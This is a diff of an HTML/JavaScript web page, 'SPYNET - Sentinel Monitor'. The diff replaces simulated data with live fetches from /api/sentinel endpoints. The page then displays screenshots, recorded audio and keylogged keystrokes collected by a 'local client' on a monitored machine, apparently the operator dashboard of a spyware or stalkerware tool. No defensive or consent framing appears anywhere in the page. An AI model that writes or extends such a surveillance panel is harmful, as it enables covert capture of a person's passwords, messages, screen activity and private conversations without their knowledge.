@@ -6,394 +6,185 @@
     <title>SPYNET - Sentinel Monitor</title>
     <link rel="icon" type="image/png" href="/static/logo.png">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0a0a;
-            min-height: 100vh;
-        }
-
-        .sidebar {
-            position: fixed;
-            left: 0;
-            top: 0;
-            width: 270px;
-            height: 100%;
-            background: linear-gradient(180deg, #0a0a1a 0%, #0d0d1a 100%);
-            border-right: 1px solid rgba(0, 255, 255, 0.2);
-            padding: 20px 0;
-        }
-
-        .logo-sidebar {
-            text-align: center;
-            padding: 20px;
-            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
-            margin-bottom: 20px;
-        }
-
-        .logo-sidebar img {
-            width: 65px;
-            height: 65px;
-            border-radius: 15px;
-            margin-bottom: 10px;
-        }
-
-        .logo-sidebar h2 {
-            color: #00ffff;
-            font-size: 20px;
-        }
-
-        .nav-item {
-            padding: 14px 24px;
-            color: #ccc;
-            cursor: pointer;
-            transition: 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-left: 3px solid transparent;
-        }
-
-        .nav-item:hover {
-            background: rgba(0, 255, 255, 0.1);
-            color: #00ffff;
-        }
-
-        .nav-item.active {
-            background: rgba(0, 255, 255, 0.15);
-            border-left-color: #00ffff;
-            color: #00ffff;
-        }
-
-        .main-content {
-            margin-left: 270px;
-            padding: 20px;
-        }
-
-        .header {
-            background: rgba(10, 10, 26, 0.9);
-            border-radius: 15px;
-            padding: 15px 25px;
-            margin-bottom: 25px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 1px solid rgba(0, 255, 255, 0.2);
-        }
-
-        .header h1 {
-            color: #00ffff;
-            font-size: 24px;
-        }
-
-        .btn-sair {
-            background: rgba(255, 68, 68, 0.2);
-            color: #ff4444;
-            border: 1px solid #ff4444;
-            padding: 8px 16px;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-
-        .status-card {
-            background: rgba(10, 10, 26, 0.9);
-            border-radius: 15px;
-            padding: 25px;
-            text-align: center;
-            margin-bottom: 25px;
-            border: 1px solid rgba(0, 255, 255, 0.2);
-        }
-
-        .status-indicator {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border-radius: 50%;
-            background: #ff4444;
-            margin-right: 10px;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; transform: scale(1); }
-            100% { opacity: 0; transform: scale(1.5); }
-        }
-
-        .status-text {
-            font-size: 22px;
-            font-weight: bold;
-            color: #ff4444;
-        }
-
-        .button-group {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            margin-bottom: 25px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 12px 35px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 14px;
-            transition: 0.3s;
-        }
-
-        .btn-start {
-            background: linear-gradient(135deg, #00aa44, #008833);
-            color: white;
-        }
-
-        .btn-start:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 15px rgba(0, 170, 68, 0.5);
-        }
-
-        .btn-stop {
-            background: linear-gradient(135deg, #ff4444, #cc0000);
-            color: white;
-        }
-
-        .btn-stop:hover {
-            transform: scale(1.05);
-        }
-
-        .btn-clear {
-            background: linear-gradient(135deg, #ffaa00, #dd8800);
-            color: #1a1a2e;
-        }
-
-        .section {
-            background: rgba(10, 10, 26, 0.9);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(0, 255, 255, 0.2);
-        }
-
-        .section h3 {
-            color: #00ffff;
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-
-        .log-area {
-            background: #0a0a0a;
-            border-radius: 10px;
-            padding: 15px;
-            color: #00ff00;
-            font-family: monospace;
-            font-size: 12px;
-            height: 180px;
-            overflow-y: auto;
-        }
-
-        .log-entry {
-            padding: 4px 0;
-            border-bottom: 1px solid rgba(0, 255, 0, 0.1);
-        }
-
-        @media (max-width: 768px) {
-            .sidebar {
-                width: 70px;
-            }
-            .logo-sidebar h2, .nav-item span:last-child {
-                display: none;
-            }
-            .main-content {
-                margin-left: 70px;
-            }
-            .button-group {
-                flex-direction: column;
-            }
-            .btn {
-                width: 100%;
-            }
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',sans-serif;background:#0a0a0a;min-height:100vh}
+        .sidebar{position:fixed;left:0;top:0;width:260px;height:100%;background:linear-gradient(180deg,#0a0a1a,#0d0d1a);border-right:1px solid rgba(0,255,255,0.2);padding:20px 0;z-index:100}
+        .logo-sidebar{text-align:center;padding:20px;border-bottom:1px solid rgba(0,255,255,0.2);margin-bottom:20px}
+        .logo-sidebar img{width:60px;height:60px;border-radius:12px;margin-bottom:8px}
+        .logo-sidebar h2{color:#00ffff;font-size:18px}
+        .logo-sidebar p{color:#666;font-size:10px}
+        .nav-item{padding:12px 24px;color:#ccc;cursor:pointer;transition:0.3s;display:flex;align-items:center;gap:12px;border-left:3px solid transparent;text-decoration:none}
+        .nav-item:hover{background:rgba(0,255,255,0.1);color:#00ffff}
+        .nav-item.active{background:rgba(0,255,255,0.15);border-left-color:#00ffff;color:#00ffff}
+        .main-content{margin-left:260px;padding:20px}
+        .header{background:rgba(10,10,26,0.9);border-radius:15px;padding:15px 25px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;border:1px solid rgba(0,255,255,0.2);flex-wrap:wrap;gap:10px}
+        .header h1{color:#00ffff;font-size:22px}
+        .btn-sair{background:rgba(255,68,68,0.2);color:#ff4444;border:1px solid #ff4444;padding:8px 16px;border-radius:8px;cursor:pointer;transition:0.3s}
+        .btn-sair:hover{background:#ff4444;color:white}
+        .status-bar{background:rgba(10,10,26,0.9);border-radius:12px;padding:15px 25px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;border:1px solid rgba(0,255,255,0.2);flex-wrap:wrap;gap:10px}
+        .led{display:inline-block;width:12px;height:12px;border-radius:50%;background:#ff4444;margin-right:8px;animation:pulse 1.5s infinite}
+        .led.on{background:#00ff00}
+        @keyframes pulse{0%{opacity:1;transform:scale(1)}100%{opacity:0;transform:scale(1.5)}}
+        .status-text{font-size:17px;font-weight:bold;color:#ff4444}
+        .status-text.on{color:#00ff00}
+        .btn-group{display:flex;gap:10px;flex-wrap:wrap}
+        .btn{padding:9px 20px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:13px;transition:0.3s}
+        .btn:hover{transform:scale(1.04)}
+        .btn-refresh{background:linear-gradient(135deg,#00aaff,#0066cc);color:white}
+        .btn-clear{background:linear-gradient(135deg,#ffaa00,#dd8800);color:#1a1a2e}
+        .stats-row{display:flex;gap:15px;margin-bottom:20px;flex-wrap:wrap}
+        .stat-box{background:rgba(10,10,26,0.9);border-radius:12px;padding:15px 20px;border:1px solid rgba(0,255,255,0.2);text-align:center;flex:1;min-width:90px}
+        .stat-box .num{font-size:26px;font-weight:bold;color:#00ffff}
+        .stat-box .lbl{font-size:11px;color:#888;margin-top:4px}
+        .monitor-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:20px}
+        .panel{background:rgba(10,10,26,0.9);border-radius:15px;border:1px solid rgba(0,255,255,0.2);overflow:hidden}
+        .panel-header{padding:12px 16px;background:rgba(0,255,255,0.05);border-bottom:1px solid rgba(0,255,255,0.15);display:flex;align-items:center;justify-content:space-between}
+        .panel-header h3{color:#00ffff;font-size:14px}
+        .count-badge{background:rgba(0,255,255,0.2);color:#00ffff;border-radius:20px;padding:2px 10px;font-size:12px;font-weight:bold}
+        .panel-body{padding:12px}
+        .screenshot-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+        .ss-thumb{border-radius:8px;overflow:hidden;cursor:pointer;border:1px solid rgba(0,255,255,0.15);transition:0.2s;background:#050510}
+        .ss-thumb:hover{border-color:#00ffff;transform:scale(1.02)}
+        .ss-thumb img{width:100%;height:78px;object-fit:cover;display:block}
+        .ss-thumb .ts{font-size:9px;color:#666;padding:3px 6px;text-align:center}
+        .audio-item{background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;margin-bottom:8px;border:1px solid rgba(0,255,255,0.1)}
+        .audio-item .an{font-size:11px;color:#00ffff;margin-bottom:5px}
+        .audio-item audio{width:100%;height:28px}
+        .keylog-area{background:#050510;border-radius:8px;padding:10px;font-family:monospace;font-size:11px;color:#00ff88;height:255px;overflow-y:auto}
+        .keylog-line{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
+        .log-full{background:rgba(10,10,26,0.9);border-radius:15px;border:1px solid rgba(0,255,255,0.2);padding:16px}
+        .log-full h3{color:#00ffff;margin-bottom:12px;font-size:14px}
+        .log-area{background:#050510;border-radius:8px;padding:10px;font-family:monospace;font-size:11px;color:#00ff00;height:130px;overflow-y:auto}
+        .log-entry{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
+        .empty{color:#444;font-size:12px;text-align:center;padding:28px 0}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.93);z-index:999;justify-content:center;align-items:center}
+        .modal.show{display:flex}
+        .modal img{max-width:90%;max-height:88vh;border-radius:10px}
+        .modal-close{position:absolute;top:18px;right:28px;font-size:36px;color:#fff;cursor:pointer;line-height:1}
+        @media(max-width:900px){.sidebar{width:70px}.logo-sidebar h2,.logo-sidebar p,.nav-item span:last-child{display:none}.main-content{margin-left:70px}.monitor-grid{grid-template-columns:1fr}}
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <div class="logo-sidebar">
-            <img src="/static/logo.png" alt="SPYNET">
-            <h2>SPYNET</h2>
+<div class="sidebar">
+    <div class="logo-sidebar">
+        <img src="/static/logo.png" alt="SPYNET" onerror="this.src='https://placehold.co/60x60/0a0a1a/00ffff?text=SN'">
+        <h2>SPYNET</h2><p>INTELLIGENCE</p>
+    </div>
+    <a class="nav-item" href="/dashboard"><span>🏠</span><span>Dashboard</span></a>
+    <a class="nav-item active" href="/sentinel"><span>🛡️</span><span>Sentinel Monitor</span></a>
+    <a class="nav-item" href="/osint"><span>🔍</span><span>OSINT IA</span></a>
+    <a class="nav-item" href="/casos"><span>📋</span><span>Casos</span></a>
+</div>
+<div class="main-content">
+    <div class="header">
+        <h1>🛡️ Sentinel Monitor — Dados Reais</h1>
+        <button class="btn-sair" onclick="window.location.href='/sair'">Sair</button>
+    </div>
+    <div class="status-bar">
+        <div style="display:flex;align-items:center">
+            <span class="led" id="led"></span>
+            <span class="status-text" id="statusText">AGUARDANDO CLIENTE LOCAL</span>
         </div>
-        <div class="nav-item" onclick="window.location.href='/dashboard'">
-            <span>🏠</span>
-            <span>Dashboard</span>
-        </div>
-        <div class="nav-item active" onclick="window.location.href='/sentinel'">
-            <span>🛡️</span>
-            <span>Sentinel Monitor</span>
-        </div>
-        <div class="nav-item" onclick="window.location.href='/osint'">
-            <span>🔍</span>
-            <span>OSINT IA</span>
-        </div>
-        <div class="nav-item" onclick="window.location.href='/casos'">
-            <span>📋</span>
-            <span>Casos</span>
+        <div class="btn-group">
+            <button class="btn btn-refresh" onclick="atualizarTudo()">🔄 ATUALIZAR</button>
+            <button class="btn btn-clear" onclick="limparLogs()">🗑️ LIMPAR LOGS</button>
         </div>
     </div>
-
-    <div class="main-content">
-        <div class="header">
-            <h1>Sentinel Monitor</h1>
-            <button class="btn-sair" onclick="window.location.href='/sair'">Sair</button>
+    <div class="stats-row">
+        <div class="stat-box"><div class="num" id="stS">0</div><div class="lbl">Screenshots</div></div>
+        <div class="stat-box"><div class="num" id="stA">0</div><div class="lbl">Audios</div></div>
+        <div class="stat-box"><div class="num" id="stK">0</div><div class="lbl">Linhas keylog</div></div>
+        <div class="stat-box"><div class="num" id="stT" style="font-size:16px">--:--</div><div class="lbl">Atualizado</div></div>
+    </div>
+    <div class="monitor-grid">
+        <div class="panel">
+            <div class="panel-header"><h3>📸 Screenshots</h3><span class="count-badge" id="ssC">0</span></div>
+            <div class="panel-body"><div class="screenshot-grid" id="ssGrid"><div class="empty" style="grid-column:span 2">Sem screenshots</div></div></div>
         </div>
-
-        <div class="status-card">
-            <div class="status-indicator" id="statusIndicator"></div>
-            <span class="status-text" id="statusText">PARADO</span>
+        <div class="panel">
+            <div class="panel-header"><h3>🎙️ Audios Capturados</h3><span class="count-badge" id="audC">0</span></div>
+            <div class="panel-body" id="audList"><div class="empty">Sem audios</div></div>
         </div>
-
-        <div class="button-group">
-            <button class="btn btn-start" id="btnIniciar">▶ INICIAR MONITORAMENTO</button>
-            <button class="btn btn-stop" id="btnParar">⏹️ PARAR</button>
-            <button class="btn btn-clear" id="btnLimpar">🗑️ LIMPAR LOGS</button>
-        </div>
-
-        <div class="section">
-            <h3>📸 SCREENSHOTS</h3>
-            <div class="log-area" id="screenshots">Nenhuma screenshot capturada</div>
-        </div>
-
-        <div class="section">
-            <h3>🎙️ ÁUDIOS</h3>
-            <div class="log-area" id="audios">Nenhum áudio capturado</div>
-        </div>
-
-        <div class="section">
-            <h3>⌨️ TECLAS DIGITADAS</h3>
-            <div class="log-area" id="teclas">Nenhuma tecla capturada</div>
-        </div>
-
-        <div class="section">
-            <h3>📋 LOG DO SISTEMA</h3>
-            <div class="log-area" id="systemLogs">Aguardando ações...</div>
+        <div class="panel">
+            <div class="panel-header"><h3>⌨️ Teclas Digitadas</h3><span class="count-badge" id="keyC">0</span></div>
+            <div class="panel-body"><div class="keylog-area" id="keyArea"><div class="keylog-line" style="color:#333">Aguardando...</div></div></div>
         </div>
     </div>
+    <div class="log-full">
+        <h3>📋 Log do Sistema</h3>
+        <div class="log-area" id="sysLog"><div class="log-entry">[--:--:--] Aguardando dados do cliente local...</div></div>
+    </div>
+</div>
+<div class="modal" id="modal" onclick="fecharModal()">
+    <span class="modal-close">&times;</span>
+    <img id="modalImg" src="" alt="">
+</div>
+<script>
+let logs=[];
+function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
+function log(m){const ts=new Date().toLocaleTimeString();logs.unshift('['+ts+'] '+m);if(logs.length>100)logs.pop();document.getElementById('sysLog').innerHTML=logs.map(l=>'<div class="log-entry">'+esc(l)+'</div>').join('')}
+function ts2time(nome){const n=nome.replace('scr_','').replace('aud_','').replace('.png','').replace('.wav','');const d=new Date(parseInt(n)*1000);return isNaN(d)?nome:d.toLocaleTimeString()}
 
-    <script>
-        let monitorAtivo = false;
-        
-        const statusIndicator = document.getElementById('statusIndicator');
-        const statusText = document.getElementById('statusText');
-        const systemLogs = document.getElementById('systemLogs');
-        const screenshotsDiv = document.getElementById('screenshots');
-        const audiosDiv = document.getElementById('audios');
-        const teclasDiv = document.getElementById('teclas');
+async function carregarStats(){
+    try{
+        const r=await fetch('/api/sentinel/stats');const d=await r.json();
+        document.getElementById('stS').textContent=d.screenshots;
+        document.getElementById('stA').textContent=d.audios;
+        document.getElementById('stK').textContent=d.teclas;
+        document.getElementById('stT').textContent=new Date().toLocaleTimeString();
+        const on=d.screenshots>0||d.audios>0||d.teclas>0;
+        document.getElementById('led').className='led'+(on?' on':'');
+        document.getElementById('statusText').className='status-text'+(on?' on':'');
+        document.getElementById('statusText').textContent=on?'CLIENTE LOCAL ATIVO':'AGUARDANDO CLIENTE LOCAL';
+    }catch(e){log('Erro stats: '+e.message)}
+}
 
-        function addLog(message, isSystem = true) {
-            const time = new Date().toLocaleTimeString();
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.innerHTML = `[${time}] ${message}`;
-            
-            if(isSystem) {
-                systemLogs.appendChild(logEntry);
-                systemLogs.scrollTop = systemLogs.scrollHeight;
-            }
-            
-            if(monitorAtivo && !isSystem) {
-                if(message.includes('screenshot')) {
-                    const ssEntry = document.createElement('div');
-                    ssEntry.className = 'log-entry';
-                    ssEntry.innerHTML = `[${time}] 📸 Screenshot capturada`;
-                    screenshotsDiv.appendChild(ssEntry);
-                    screenshotsDiv.scrollTop = screenshotsDiv.scrollHeight;
-                }
-                if(message.includes('audio')) {
-                    const audioEntry = document.createElement('div');
-                    audioEntry.className = 'log-entry';
-                    audioEntry.innerHTML = `[${time}] 🎙️ Áudio capturado`;
-                    audiosDiv.appendChild(audioEntry);
-                    audiosDiv.scrollTop = audiosDiv.scrollHeight;
-                }
-                if(message.includes('tecla')) {
-                    const teclaEntry = document.createElement('div');
-                    teclaEntry.className = 'log-entry';
-                    teclaEntry.innerHTML = `[${time}] ⌨️ ${message}`;
-                    teclasDiv.appendChild(teclaEntry);
-                    teclasDiv.scrollTop = teclasDiv.scrollHeight;
-                }
-            }
-        }
+async function carregarScreenshots(){
+    try{
+        const r=await fetch('/api/sentinel/screenshots');const a=await r.json();
+        document.getElementById('ssC').textContent=a.length;
+        const g=document.getElementById('ssGrid');
+        if(!a.length){g.innerHTML='<div class="empty" style="grid-column:span 2">Sem screenshots</div>';return}
+        g.innerHTML=a.map(n=>'<div class="ss-thumb" onclick="abrirModal(\'/api/sentinel/screenshot/'+encodeURIComponent(n)+'\')"><img src="/api/sentinel/screenshot/'+encodeURIComponent(n)+'" loading="lazy" onerror="this.parentElement.style.display=\'none\'"><div class="ts">'+ts2time(n)+'</div></div>').join('');
+        log('Screenshots: '+a.length+' carregadas');
+    }catch(e){log('Erro screenshots: '+e.message)}
+}
 
-        function atualizarStatusUI() {
-            if(monitorAtivo) {
-                statusIndicator.style.background = '#00ff00';
-                statusText.style.color = '#00ff00';
-                statusText.textContent = 'MONITORANDO ATIVO';
-            } else {
-                statusIndicator.style.background = '#ff4444';
-                statusText.style.color = '#ff4444';
-                statusText.textContent = 'PARADO';
-            }
-        }
+async function carregarAudios(){
+    try{
+        const r=await fetch('/api/sentinel/audios');const a=await r.json();
+        document.getElementById('audC').textContent=a.length;
+        const l=document.getElementById('audList');
+        if(!a.length){l.innerHTML='<div class="empty">Sem audios</div>';return}
+        l.innerHTML=a.map(n=>'<div class="audio-item"><div class="an">🎙️ '+ts2time(n)+'</div><audio controls><source src="/api/sentinel/audio/'+encodeURIComponent(n)+'" type="audio/wav"></audio></div>').join('');
+        log('Audios: '+a.length+' carregados');
+    }catch(e){log('Erro audios: '+e.message)}
+}
 
-        let screenshotInterval, audioInterval, teclaInterval;
-        
-        function iniciarSimulacao() {
-            if(screenshotInterval) clearInterval(screenshotInterval);
-            if(audioInterval) clearInterval(audioInterval);
-            if(teclaInterval) clearInterval(teclaInterval);
-            
-            screenshotInterval = setInterval(() => {
-                if(monitorAtivo) addLog('screenshot: captura', false);
-            }, 10000);
-            
-            audioInterval = setInterval(() => {
-                if(monitorAtivo) addLog('audio: captura', false);
-            }, 15000);
-            
-            const teclas = ['A', 'B', 'C', 'Enter', 'Espaço', 'Delete'];
-            teclaInterval = setInterval(() => {
-                if(monitorAtivo) {
-                    const tecla = teclas[Math.floor(Math.random() * teclas.length)];
-                    addLog(`tecla: ${tecla}`, false);
-                }
-            }, 3000);
-        }
-        
-        function pararSimulacao() {
-            if(screenshotInterval) clearInterval(screenshotInterval);
-            if(audioInterval) clearInterval(audioInterval);
-            if(teclaInterval) clearInterval(teclaInterval);
-        }
+async function carregarKeylog(){
+    try{
+        const r=await fetch('/api/sentinel/keylog');const a=await r.json();
+        document.getElementById('keyC').textContent=a.length;
+        const el=document.getElementById('keyArea');
+        if(!a.length){el.innerHTML='<div class="keylog-line" style="color:#333">Sem teclas capturadas</div>';return}
+        el.innerHTML=[...a].reverse().map(l=>'<div class="keylog-line">'+esc(l)+'</div>').join('');
+        el.scrollTop=0;
+        log('Keylog: '+a.length+' linhas');
+    }catch(e){log('Erro keylog: '+e.message)}
+}
 
-        document.getElementById('btnIniciar').onclick = () => {
-            monitorAtivo = true;
-            atualizarStatusUI();
-            addLog('🟢 SISTEMA INICIADO - Monitoramento ativo');
-            iniciarSimulacao();
-        };
+async function atualizarTudo(){
+    log('Atualizando...');
+    await Promise.all([carregarStats(),carregarScreenshots(),carregarAudios(),carregarKeylog()]);
+    log('Atualizado com sucesso');
+}
 
-        document.getElementById('btnParar').onclick = () => {
-            monitorAtivo = false;
-            atualizarStatusUI();
-            addLog('🔴 SISTEMA PARADO - Monitoramento desativado');
-            pararSimulacao();
-        };
+function abrirModal(src){document.getElementById('modalImg').src=src;document.getElementById('modal').classList.add('show')}
+function fecharModal(){document.getElementById('modal').classList.remove('show');document.getElementById('modalImg').src=''}
+function limparLogs(){logs=[];document.getElementById('sysLog').innerHTML='<div class="log-entry">[--:--:--] Logs limpos.</div>';log('Logs limpos')}
 
-        document.getElementById('btnLimpar').onclick = () => {
-            screenshotsDiv.innerHTML = 'Nenhuma screenshot capturada';
-            audiosDiv.innerHTML = 'Nenhum áudio capturado';
-            teclasDiv.innerHTML = 'Nenhuma tecla capturada';
-            systemLogs.innerHTML = 'Logs limpos!';
-            addLog('🧹 LOGS LIMPOS');
-        };
-
-        atualizarStatusUI();
-    </script>
+atualizarTudo();
+setInterval(atualizarTudo,15000);
+</script>
 </body>
 </html>
